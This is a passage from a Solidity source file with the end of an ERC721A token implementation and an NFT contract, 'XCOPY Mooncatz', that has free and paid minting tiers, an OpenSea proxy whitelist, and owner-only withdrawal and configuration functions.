1078      * Requirements:
1079      *
1080      * - `to` cannot be the zero address.
1081      * - `quantity` must be greater than 0.
1082      *
1083      * Emits a {Transfer} event.
1084      */
1085     function _mint(
1086         address to,
1087         uint256 quantity,
1088         bytes memory _data,
1089         bool safe
1090     ) internal {
1091         uint256 startTokenId = _currentIndex;
1092         if (to == address(0)) revert MintToZeroAddress();
1093         if (quantity == 0) revert MintZeroQuantity();
1094 
1095         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1096 
1097         // Overflows are incredibly unrealistic.
1098         // balance or numberMinted overflow if current value of either + quantity > 1.8e19 (2**64) - 1
1099         // updatedIndex overflows if _currentIndex + quantity > 1.2e77 (2**256) - 1
1100         unchecked {
1101             _addressData[to].balance += uint64(quantity);
1102             _addressData[to].numberMinted += uint64(quantity);
1103 
1104             _ownerships[startTokenId].addr = to;
1105             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1106 
1107             uint256 updatedIndex = startTokenId;
1108             uint256 end = updatedIndex + quantity;
1109 
1110             if (safe && to.isContract()) {
1111                 do {
1112                     emit Transfer(address(0), to, updatedIndex);
1113                     if (!_checkContractOnERC721Received(address(0), to, updatedIndex++, _data)) {
1114                         revert TransferToNonERC721ReceiverImplementer();
1115                     }
1116                 } while (updatedIndex != end);
1117                 // Reentrancy protection
1118                 if (_currentIndex != startTokenId) revert();
1119             } else {
1120                 do {
1121                     emit Transfer(address(0), to, updatedIndex++);
1122                 } while (updatedIndex != end);
1123             }
1124             _currentIndex = updatedIndex;
1125         }
1126         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1127     }
1128 
1129     /**
1130      * @dev Transfers `tokenId` from `from` to `to`.
1131      *
1132      * Requirements:
1133      *
1134      * - `to` cannot be the zero address.
1135      * - `tokenId` token must be owned by `from`.
1136      *
1137      * Emits a {Transfer} event.
1138      */
1139     function _transfer(
1140         address from,
1141         address to,
1142         uint256 tokenId
1143     ) private {
1144         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1145 
1146         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1147             isApprovedForAll(prevOwnership.addr, _msgSender()) ||
1148             getApproved(tokenId) == _msgSender());
1149 
1150         if (!isApprovedOrOwner) revert TransferCallerNotOwnerNorApproved();
1151         if (prevOwnership.addr != from) revert TransferFromIncorrectOwner();
1152         if (to == address(0)) revert TransferToZeroAddress();
1153 
1154         _beforeTokenTransfers(from, to, tokenId, 1);
1155 
1156         // Clear approvals from the previous owner
1157         _approve(address(0), tokenId, prevOwnership.addr);
1158 
1159         // Underflow of the sender's balance is impossible because we check for
1160         // ownership above and the recipient's balance can't realistically overflow.
1161         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1162         unchecked {
1163             _addressData[from].balance -= 1;
1164             _addressData[to].balance += 1;
1165 
1166             _ownerships[tokenId].addr = to;
1167             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1168 
1169             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1170             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1171             uint256 nextTokenId = tokenId + 1;
1172             if (_ownerships[nextTokenId].addr == address(0)) {
1173                 // This will suffice for checking _exists(nextTokenId),
1174                 // as a burned slot cannot contain the zero address.
1175                 if (nextTokenId < _currentIndex) {
1176                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1177                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1178                 }
1179             }
1180         }
1181 
1182         emit Transfer(from, to, tokenId);
1183         _afterTokenTransfers(from, to, tokenId, 1);
1184     }
1185 
1186     /**
1187      * @dev Destroys `tokenId`.
1188      * The approval is cleared when the token is burned.
1189      *
1190      * Requirements:
1191      *
1192      * - `tokenId` must exist.
1193      *
1194      * Emits a {Transfer} event.
1195      */
1196     function _burn(uint256 tokenId) internal virtual {
1197         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1198 
1199         _beforeTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1200 
1201         // Clear approvals from the previous owner
1202         _approve(address(0), tokenId, prevOwnership.addr);
1203 
1204         // Underflow of the sender's balance is impossible because we check for
1205         // ownership above and the recipient's balance can't realistically overflow.
1206         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1207         unchecked {
1208             _addressData[prevOwnership.addr].balance -= 1;
1209             _addressData[prevOwnership.addr].numberBurned += 1;
1210 
1211             // Keep track of who burned the token, and the timestamp of burning.
1212             _ownerships[tokenId].addr = prevOwnership.addr;
1213             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1214             _ownerships[tokenId].burned = true;
1215 
1216             // If the ownership slot of tokenId+1 is not explicitly set, that means the burn initiator owns it.
1217             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1218             uint256 nextTokenId = tokenId + 1;
1219             if (_ownerships[nextTokenId].addr == address(0)) {
1220                 // This will suffice for checking _exists(nextTokenId),
1221                 // as a burned slot cannot contain the zero address.
1222                 if (nextTokenId < _currentIndex) {
1223                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1224                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1225                 }
1226             }
1227         }
1228 
1229         emit Transfer(prevOwnership.addr, address(0), tokenId);
1230         _afterTokenTransfers(prevOwnership.addr, address(0), tokenId, 1);
1231 
1232         // Overflow not possible, as _burnCounter cannot be exceed _currentIndex times.
1233         unchecked {
1234             _burnCounter++;
1235         }
1236     }
1237 
1238     /**
1239      * @dev Approve `to` to operate on `tokenId`
1240      *
1241      * Emits a {Approval} event.
1242      */
1243     function _approve(
1244         address to,
1245         uint256 tokenId,
1246         address owner
1247     ) private {
1248         _tokenApprovals[tokenId] = to;
1249         emit Approval(owner, to, tokenId);
1250     }
1251 
1252     /**
1253      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1254      *
1255      * @param from address representing the previous owner of the given token ID
1256      * @param to target address that will receive the tokens
1257      * @param tokenId uint256 ID of the token to be transferred
1258      * @param _data bytes optional data to send along with the call
1259      * @return bool whether the call correctly returned the expected magic value
1260      */
1261     function _checkContractOnERC721Received(
1262         address from,
1263         address to,
1264         uint256 tokenId,
1265         bytes memory _data
1266     ) private returns (bool) {
1267         try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1268             return retval == IERC721Receiver(to).onERC721Received.selector;
1269         } catch (bytes memory reason) {
1270             if (reason.length == 0) {
1271                 revert TransferToNonERC721ReceiverImplementer();
1272             } else {
1273                 assembly {
1274                     revert(add(32, reason), mload(reason))
1275                 }
1276             }
1277         }
1278     }
1279 
1280     /**
1281      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1282      * And also called before burning one token.
1283      *
1284      * startTokenId - the first token id to be transferred
1285      * quantity - the amount to be transferred
1286      *
1287      * Calling conditions:
1288      *
1289      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1290      * transferred to `to`.
1291      * - When `from` is zero, `tokenId` will be minted for `to`.
1292      * - When `to` is zero, `tokenId` will be burned by `from`.
1293      * - `from` and `to` are never both zero.
1294      */
1295     function _beforeTokenTransfers(
1296         address from,
1297         address to,
1298         uint256 startTokenId,
1299         uint256 quantity
1300     ) internal virtual {}
1301 
1302     /**
1303      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1304      * minting.
1305      * And also called after one token has been burned.
1306      *
1307      * startTokenId - the first token id to be transferred
1308      * quantity - the amount to be transferred
1309      *
1310      * Calling conditions:
1311      *
1312      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
1313      * transferred to `to`.
1314      * - When `from` is zero, `tokenId` has been minted for `to`.
1315      * - When `to` is zero, `tokenId` has been burned by `from`.
1316      * - `from` and `to` are never both zero.
1317      */
1318     function _afterTokenTransfers(
1319         address from,
1320         address to,
1321         uint256 startTokenId,
1322         uint256 quantity
1323     ) internal virtual {}
1324 }
1325 
1326 
1327 
1328 contract XCOPYmooncatz is ERC721A, Owneable {
1329 
1330     string public baseURI = "ipfs://QmbCQK9DHUPNtwDCF6r8H9r9Kk3NUYpPpApU9yknnVbXF2/";
1331     string public contractURI = "ipfs://QmekMBQ3A8iaVHC2oqgwdCMU9JHTmswetxxX6s5VrYeAra";
1332     string public constant baseExtension = ".json";
1333     address public constant proxyRegistryAddress = 0xa5409ec958C83C3f309868babACA7c86DCB077c1;
1334 
1335     uint256 public constant MAX_PER_TX_FREE = 4;
1336     uint256 public FREE_MAX_SUPPLY = 2500;
1337     uint256 public constant MAX_PER_TX = 10;
1338     uint256 public MAX_SUPPLY = 5555;
1339     uint256 public price = 0.002 ether;
1340 
1341     bool public paused = true;
1342 
1343     constructor() ERC721A("XCOPY Mooncatz", "XMCZ") {}
1344 
1345     function mint(uint256 _amount) external payable {
1346         address _caller = _msgSender();
1347         require(!paused, "Paused");
1348         require(MAX_SUPPLY >= totalSupply() + _amount, "Exceeds max supply");
1349         require(_amount > 0, "No 0 mints");
1350         require(tx.origin == _caller, "No contracts");
1351         require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1352         
1353       if(FREE_MAX_SUPPLY >= totalSupply()){
1354             require(MAX_PER_TX_FREE >= _amount , "Excess max per free tx");
1355         }else{
1356             require(MAX_PER_TX >= _amount , "Excess max per paid tx");
1357             require(_amount * price == msg.value, "Invalid funds provided");
1358         }
1359 
1360 
1361         _safeMint(_caller, _amount);
1362     }
1363 
1364   
1365 
1366     function isApprovedForAll(address owner, address operator)
1367         override
1368         public
1369         view
1370         returns (bool)
1371     {
1372         // Whitelist OpenSea proxy contract for easy trading.
1373         ProxyRegistry proxyRegistry = ProxyRegistry(proxyRegistryAddress);
1374         if (address(proxyRegistry.proxies(owner)) == operator) {
1375             return true;
1376         }
1377 
1378         return super.isApprovedForAll(owner, operator);
1379     }
1380 
1381     function withdraw() external onlyOwner {
1382         uint256 balance = address(this).balance;
1383         (bool success, ) = _msgSender().call{value: balance}("");
1384         require(success, "Failed to send");
1385     }
1386 
1387     function collect() external onlyOwner {
1388         _safeMint(_msgSender(), 5);
1389     }
1390 
1391     function pause(bool _state) external onlyOwner {
1392         paused = _state;
1393     }
1394 
1395     function setBaseURI(string memory baseURI_) external onlyOwner {
1396         baseURI = baseURI_;
1397     }
1398 
1399     function setContractURI(string memory _contractURI) external onlyOwner {
1400         contractURI = _contractURI;
1401     }
1402 
1403     function configPrice(uint256 newPrice) public onlyOwner {
1404         price = newPrice;
1405     }
1406 
1407     function configMAX_SUPPLY(uint256 newSupply) public onlyOwner {
1408         MAX_SUPPLY = newSupply;
1409     }
1410 
1411     function configFREE_MAX_SUPPLY(uint256 newFreesupply) public onlyOwner {
1412         FREE_MAX_SUPPLY = newFreesupply;
1413     }
1414 
1415     function tokenURI(uint256 _tokenId) public view override returns (string memory) {
1416         require(_exists(_tokenId), "Token does not exist.");
1417         return bytes(baseURI).length > 0 ? string(
1418             abi.encodePacked(
1419               baseURI,
1420               Strings.toString(_tokenId),
1421               baseExtension
1422             )
1423         ) : "";
1424     }
1425 }
1426 
1427 contract OwnableDelegateProxy { }
1428 contract ProxyRegistry {
1429     mapping(address => OwnableDelegateProxy) public proxies;
1430 }